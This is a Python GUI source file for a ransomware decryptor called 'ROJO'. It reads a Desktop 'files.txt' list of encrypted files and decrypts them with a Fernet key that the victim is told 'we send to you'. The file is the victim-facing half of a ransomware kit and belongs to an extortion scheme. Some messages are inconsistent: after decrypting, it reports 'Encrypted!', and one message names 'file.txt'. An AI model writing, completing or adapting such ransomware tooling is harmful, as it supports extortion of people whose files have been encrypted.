import ctypes.wintypes
import os
import tkinter as tk

from tkinter import messagebox, filedialog
from cryptography.fernet import Fernet

root = tk.Tk()
root.geometry('700x500')
root.resizable(0,0)
root.title('ROJO AUTO DECRYPTOR')

def manual():
    Key = keyentry.get()
    if len(Key) == 0:
        messagebox.showerror(title="Error", message="Enter something in key.")
    else:
        filepath = filedialog.askopenfilename()
        try:
            with open(filepath, 'rb') as rbp:
                encrypted_content = rbp.read()
            with open(filepath, 'wb') as wbp:
                wbp.write(Fernet(Key).decrypt(encrypted_content))

            lbl.config(text='Encrypted!')
        except:
            messagebox.showerror(title='Error', message="Couldn't Encrypt the file.")

def MAIN():
    if len(keyentry.get()) == 0:
        messagebox.showerror(title="Error", message="Enter something in key.")
    else:
        s = messagebox.askyesno(title="Warning!", message="DO NOT PUT INVALID KEY IN THE ENTRY. IF YOU DO SO, YOU CANNOT GET BACK YOUR FILES. DOUBLE CHECK THE KEY THAT WE SEND TO YOU.")
        if s:
            Key = keyentry.get()
            buf = ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
            ctypes.windll.shell32.SHGetFolderPathW(None, 0, None, 0, buf)
            try:
                filetxtpath = os.path.join(buf.value, 'files.txt')
                getpaths_ = open(filetxtpath, 'r', encoding='UTF-8')
                getpaths = getpaths_.read().splitlines()
                getpaths.pop(0)
                getpaths_.close()
                labelstatus.config(text='Status: Decrypting....')
                for filetodec in getpaths:
                    try:
                        with open(filetodec, 'rb') as rbp:
                            encrypted_content = rbp.read()
                        with open(filetodec, 'wb') as wbp:
                            wbp.write(Fernet(Key).decrypt(encrypted_content))
                            print(f"SUCCESS! DECRYPTED: {filetodec}")
                    except:
                        print(f"ERROR! Couldn't Decrypt: {filetodec}")
                labelstatus.config(text='Status: DONE!')
                messagebox.showinfo(title="Done", message="The auto decryptor decrypted all the files in 'file.txt'. You can use your PC now.\n(If you can't use any file/still seeing a file is encrypted. Go to Manual Decryptor and Decrypt it)")
            except FileNotFoundError:
                messagebox.showerror(title="Error", message="Error! Couldn't find 'files.txt'. You need to decrypt all the files manually if you moved the 'files.txt' file.")
        else:  
            pass

class Gui:

    def Manual_Gui():
        manualroot = tk.Tk()
        manualroot.title('ROJO MANUAL DECRYPTOR')
        manualroot.geometry('200x300')
        manualroot.resizable(0,0)

        opnbtn = tk.Button(manualroot, text="Decrypt", font=('Arial, 18'), command=manual)
        opnbtn.place(x=50,y=60)

        global lbl
        lbl = tk.Label(manualroot, text='', font=('Arial', 14))
        lbl.place(x=55, y=170)

        manualroot.mainloop()
    
    def Main_Gui():
        titlelabel = tk.Label(root, text='ROJO DECRYPTOR', font=('Arial', 20))
        titlelabel.place(x=50, y=50)

        keylabel = tk.Label(root, text='Key: ', font=('Arial', 12))
        keylabel.place(x=50, y=155)
        
        global keyentry
        keyentry = tk.Entry(root, font=('Ariel', 12))
        keyentry.place(x=100, y=157, width=350)

        autobtn = tk.Button(root, text='Start Decrypting', font=('Arial', 20), command=MAIN)
        autobtn.place(x=100, y=250)

        manualbtn = tk.Button(root, text='Manual Decryptor', font=('Arial', 12), command=Gui.Manual_Gui)
        manualbtn.place(x=400, y=50)

        global labelstatus
        labelstatus = tk.Label(root, text='Status: OFF', font=('Arial', 20))
        labelstatus.place(x=100, y=390)


if __name__ == '__main__':
    Gui.Main_Gui()
    root.mainloop()